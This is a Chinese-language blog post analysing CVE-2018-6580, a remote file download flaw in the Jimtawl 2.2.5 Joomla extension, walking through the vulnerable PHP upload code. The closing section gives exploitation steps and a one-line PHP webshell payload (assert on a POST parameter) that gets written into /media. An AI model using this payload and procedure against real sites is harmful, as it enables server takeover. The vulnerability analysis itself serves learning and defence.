<!DOCTYPE html>
<html lang=""><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>关于CVE-2018-6580其他Tips分析</title>
    <meta name="description" content="倾旋的博客">
    <meta name="author" content='倾旋'>

    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">

    
    <link rel="stylesheet" href="/sass/researcher.min.css">

    
        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
    

    
        
    
</head>

    <body><div class="container mt-5">
    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
          
          倾旋的博客
        </a>
        <div class="navbar-nav flex-row flex-wrap justify-content-center">
            
                
                
                    <a class="nav-item nav-link" href="/about" title="About">
                        About
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/projects/" title="Projects">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg>Projects
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/links/" title="Links">
                        Links
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/post/" title="Posts">
                        Posts
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
                        Rss
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/tools/" title="Tools">
                        Tools
                    </a>
                    
                
            
        </div>
    </nav>
</div>
<hr>
<div id="content">
<div class="container">
    <p>本文分析一下CVE-2018-6580漏洞的产生原因</p>
<ul>
<li>目录
{:toc}</li>
</ul>
<h2 id="0x01-前言">0x01 前言</h2>
<p>很久没有代码审计了，无意的逛着Exploit-DB看到了几个关于Joomla!的漏洞，想分析一下看看。</p>
<p>审计环境：</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>组件版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>Joomla</td>
<td>3.8.5</td>
</tr>
<tr>
<td>Apache</td>
<td>2.4</td>
</tr>
<tr>
<td>PHP</td>
<td>5.4</td>
</tr>
<tr>
<td>操作系统</td>
<td>Windows7</td>
</tr>
</tbody>
</table>
<h2 id="0x02-漏洞简介">0X02 漏洞简介</h2>
<p>Exploit-DB地址：https://www.exploit-db.com/exploits/43958/</p>
<p>该漏洞不是Joomla的漏洞，是其中一个组件的漏洞，名字叫“Jimtawl”，漏洞版本是：“2.2.5”</p>
<ul>
<li>组件下载地址：http://janguo.de/lang-en/joomla-25-higher/jimtawl/pkg_jimtawl-2-2-5-current-r561-zip.raw</li>
<li><a href="https://extensions.joomla.org/extension/jimtawl/">https://extensions.joomla.org/extension/jimtawl/</a></li>
</ul>
<p>Jimtawl代表网络上的一个电台。向访问者显示您的节目日历，节目详情，播放列表以及正在播放的人员。</p>
<p><strong>功能如下：</strong></p>
<ul>
<li>提供广播节目：广播时间，下一个广播日期，说明，团队，联系人，网站</li>
<li>介绍主持人和编辑的东西：名字，图片，描述</li>
<li>为当前节目安排和创建播放列表</li>
<li>呈现细分：标题，文字，音频，类别，流派，图像</li>
<li>导航程序日历</li>
<li>分段存档</li>
<li>模块“现在谁在空中”</li>
<li>支持Joomlas搜索</li>
<li>Podcast Feed</li>
</ul>
<p>它的漏洞产生原因是任意文件上传，你一定会觉得匪夷所思，Joomla这么成熟的项目，它们的组件会不会也比较安全？ You are wrong..</p>
<h2 id="0x03-代码分析">0x03 代码分析</h2>
<p>Exploit-DB上给出了一些简短的描述，但是这也足够了，我们可以通过URL找到漏洞对应的代码。</p>
<p><code>index.php?option=com_jimtawl&amp;view=upload&amp;task=upload&amp;pop=true&amp;tmpl=component</code></p>
<p>这个页面是用来上传文件地方。</p>
<p><code>/components/com_jimtawl/models/media.php</code> 107 Lines :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#f92672">....</span>

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">import</span>($url <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>, $path <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>) {
		<span style="color:#66d9ef">global</span> $_FILES;
		
		<span style="color:#a6e22e">jimport</span>(<span style="color:#e6db74">&#39;joomla.filesystem.path&#39;</span>);
		<span style="color:#a6e22e">jimport</span>(<span style="color:#e6db74">&#39;joomla.filesystem.file&#39;</span>);
		$config <span style="color:#f92672">=</span> <span style="color:#a6e22e">JComponentHelper</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">getParams</span>(<span style="color:#e6db74">&#39;com_jimtawl&#39;</span>);
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">jimtawl_fileinfo</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JPath</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">clean</span>(<span style="color:#a6e22e">JPATH_SITE</span> <span style="color:#f92672">.</span> $config<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;upload_dir&#39;</span>, <span style="color:#e6db74">&#39;/media/&#39;</span>));
		<span style="color:#66d9ef">if</span> ($path) {
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">is_local</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; 
			$ext <span style="color:#f92672">=</span> 	<span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">JFile</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getExt</span>($path));
			<span style="color:#66d9ef">switch</span>($ext ) {
				<span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;wav&#39;</span><span style="color:#f92672">:</span>
					$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_get_localfile</span>($url, $path);
					<span style="color:#66d9ef">break</span>;
				<span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;ogg&#39;</span><span style="color:#f92672">:</span>
				<span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;mp3&#39;</span><span style="color:#f92672">:</span>
					$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_get_local_fileinfo</span>($path);
					$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_move_uploaded</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span>);
				<span style="color:#66d9ef">break</span>;
			}
			
		} <span style="color:#66d9ef">else</span> {
			<span style="color:#66d9ef">if</span> ($url) {
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_get_remotefile</span>($url);
			} <span style="color:#66d9ef">else</span> {
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_fileinfo_from_array</span>($_FILES[<span style="color:#e6db74">&#39;userfile&#39;</span>]);
				<span style="color:#a6e22e">unset</span> ($_FILES[<span style="color:#e6db74">&#39;userfile&#39;</span>]);
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_move_uploaded</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span>);
			}
		}
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_setMediaType</span>();
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_import_media</span>();		
	}
	<span style="color:#f92672">......</span>
</code></pre></div><p>该方法主要是来处理上传逻辑的，可以看到一开始就先获取一些优先文件，例如：<code>wav,ogg,mp3</code>这类的会被分别调用<code>_get_localfile</code>方法去进行上传。</p>
<p>我们主要关注的还是从<code>if($url)</code>开始：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">if</span> ($url) {
	$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_get_remotefile</span>($url);
	} <span style="color:#66d9ef">else</span> {
	$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_fileinfo_from_array</span>($_FILES[<span style="color:#e6db74">&#39;userfile&#39;</span>]);
	<span style="color:#a6e22e">unset</span> ($_FILES[<span style="color:#e6db74">&#39;userfile&#39;</span>]);
	$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_move_uploaded</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span>);
}
</code></pre></div><p>跟踪一下<code>_get_remotefile</code>函数：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
      <span style="color:#f92672">....</span>

<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_get_remotefile</span>($url) {
		$info <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url); <span style="color:#75715e">// 当我们的URL传递进来后先解析URL地址
</span><span style="color:#75715e"></span>		$pathinfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;/&#34;</span>, $info[<span style="color:#e6db74">&#39;path&#39;</span>]); <span style="color:#75715e">// 获取URI
</span><span style="color:#75715e"></span>		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">end</span>($pathinfo);
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
		<span style="color:#66d9ef">if</span> ($info[<span style="color:#e6db74">&#34;host&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>)
			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
		<span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span> ($info[<span style="color:#e6db74">&#34;port&#34;</span>])) <span style="color:#66d9ef">or</span> ($info[<span style="color:#e6db74">&#34;port&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>))
			$info[<span style="color:#e6db74">&#34;port&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>;
		$fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($info[<span style="color:#e6db74">&#34;host&#34;</span>], $info[<span style="color:#e6db74">&#34;port&#34;</span>], $errno, $errstr, <span style="color:#ae81ff">30</span>); <span style="color:#75715e">// 连接远程服务器
</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> ($fp) {
			<span style="color:#a6e22e">fputs</span>($fp, <span style="color:#e6db74">&#34;HEAD &#34;</span> <span style="color:#f92672">.</span> $info[<span style="color:#e6db74">&#34;path&#34;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; HTTP/1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;Host: &#34;</span> <span style="color:#f92672">.</span> $info[<span style="color:#e6db74">&#34;host&#34;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>);
			<span style="color:#66d9ef">do</span> {
				$response <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($fp, <span style="color:#ae81ff">1024</span>);
			} <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">feof</span>($fp) <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">stristr</span>($response, <span style="color:#e6db74">&#39;content-length&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>); <span style="color:#75715e">// 一直读取文件
</span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stristr</span>($response, <span style="color:#e6db74">&#39;content-length&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">size</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($response, <span style="color:#ae81ff">16</span>);
			} <span style="color:#66d9ef">else</span> {
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">size</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
			}
			<span style="color:#a6e22e">fclose</span>($fp); <span style="color:#75715e">// 关闭连接 
</span><span style="color:#75715e"></span>		} <span style="color:#66d9ef">else</span> {
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
		}
		$file_in <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($url, <span style="color:#e6db74">&#34;r&#34;</span>);  <span style="color:#75715e">// 这里再次读取，其实可以用file_get_contents...
</span><span style="color:#75715e"></span>		$file_out <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span>, <span style="color:#e6db74">&#34;w&#34;</span>); <span style="color:#75715e">// 重新打开一个文件描述符，准备将文件写入服务器
</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> ($file_out) {
			<span style="color:#a6e22e">fwrite</span>($file_out, <span style="color:#a6e22e">fread</span>($file_in, <span style="color:#ae81ff">4056</span>));  <span style="color:#75715e">// 读取 4056个字节并写入文件
</span><span style="color:#75715e"></span>			<span style="color:#a6e22e">fclose</span>($file_out);
		} <span style="color:#66d9ef">else</span> {
			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JError</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">raiseError</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">JText</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">_</span>(<span style="color:#e6db74">&#39;Unable to open file &#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span> ));
		}

		<span style="color:#a6e22e">fclose</span>($file_in);
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">extern</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> $url;
	}
	<span style="color:#f92672">.......</span>
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>上面简单分析了一下代码，逻辑不是很难，主要是我不是很了解这个cms的框架，只能看个大概了。</p>
<h2 id="0x04-远程文件任意下载">0x04 远程文件任意下载</h2>
<p>上面分析了这么多，这个洞到底出现在哪里呢？</p>
<p>其实主要就是未对文件扩展名进行校验，其实他们是有校验方法的，只是没有调用的不是时候：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
  <span style="color:#f92672">....</span>
<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_setMediaType</span>() {
		<span style="color:#75715e">// is this audio, image, or not allowed?
</span><span style="color:#75715e"></span>		$media_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-1&#34;</span>;
		$path_info <span style="color:#f92672">=</span> <span style="color:#a6e22e">pathinfo</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>);
		$extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>($path_info[<span style="color:#e6db74">&#34;extension&#34;</span>]);
		<span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">count</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">mediatypes</span>); $i<span style="color:#f92672">++</span>) {
			$mimetypes <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34; &#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">mediatypes</span>[$i][<span style="color:#e6db74">&#39;extensions&#39;</span>]);
			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($extension, $mimetypes)) {
				$media_type <span style="color:#f92672">=</span> $i;
			}
		}
		<span style="color:#66d9ef">if</span> ($media_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-1&#34;</span>)
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_info</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">media_type</span> <span style="color:#f92672">=</span> $media_type;
		<span style="color:#75715e">/// print_r($this-&gt;file_info);die;
</span><span style="color:#75715e"></span>		$mediaTypeName <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">mediatypes</span>[$media_type][<span style="color:#e6db74">&#39;name&#39;</span>];

		<span style="color:#66d9ef">return</span> $mediaTypeName;
	}
	<span style="color:#f92672">....</span>
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>这里是遍历了白名单扩展名，进行比较……</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x01.png" alt="上传页面"></p>
<p>利用上面的过程非常简单，只需要在URL Link中输入一个扩展名为PHP的远程文件，注意，它的代码必须是这样：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;?php assert($_POST[&#34;test&#34;]);?&gt;&#39;</span>;
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>因为如果直接保存一句话木马，它还是会被我们的PHP环境解析，当然也可以将PHP的解析去掉 ~</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x02.png" alt="上传页面"></p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x03.png" alt="上传页面"></p>
<p>在组件上提交这个URL：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x04.png" alt="上传页面"></p>
<p>当文件上传上去以后，我们就可以在<code>/media</code>文件夹下发现我们的文件了：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x05.png" alt="上传页面"></p>
<h2 id="0x05-总结">0x05 总结</h2>
<p>这个漏洞只是提及了一个简单的远程文件下载漏洞，而在Exploit-DB上披露的是直接上传文件漏洞。我认为可以刷一个CVE，但是没必要了，贵在学习</p>
</div>

        </div><div id="footer" class="mb-5">
    <hr>
    <div class="container text-center">
        
            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
        
            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
        
    </div>
    
        <div class="container text-center">
            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
        </div>
    
</div>



<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
<script>
(function(){
  let plantumlPrefix = "language-plantuml";
  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
    let image = document.createElement("IMG");
    image.loading = 'lazy'; 
    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
    code.parentNode.insertBefore(image, code);
    code.style.display = 'none';
  });
})();
</script>

</body>
</html>
